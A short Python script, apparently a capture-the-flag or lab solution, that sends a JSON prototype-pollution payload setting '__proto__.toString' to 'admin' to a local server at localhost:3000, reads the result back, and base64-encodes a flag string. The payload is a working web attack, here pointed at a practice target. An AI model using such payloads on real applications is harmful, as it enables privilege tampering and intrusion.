import base64
import requests

payload= {"__proto__":{"toString":"admin"}}


req = requests.post("http://localhost:3000/proto", json=payload)
print(req.content)


print(requests.get("http://localhost:3000/proto").text)



msg = "softice"
bytes = msg.encode("ascii")
flag =  base64.b64encode(bytes)
msg = flag.decode("ascii")
print(msg)